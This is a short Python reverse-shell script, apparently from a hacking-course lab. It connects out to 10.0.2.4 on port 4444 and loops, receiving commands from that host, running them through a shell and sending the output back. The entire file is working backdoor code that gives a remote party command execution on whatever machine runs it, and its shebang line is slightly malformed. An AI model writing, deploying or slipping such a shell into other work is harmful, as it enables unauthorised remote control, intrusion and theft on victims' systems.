#!usr/bin/env python3

import socket
import subprocess


def execute_system_command(command):
    return subprocess.check_output(command, shell=True)


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("10.0.2.4", 4444))
connection.send(b"type your command")
while True:
    command = connection.recv(1024)
    command_result = execute_system_command(command)
    connection.send(command_result)
connection.close()
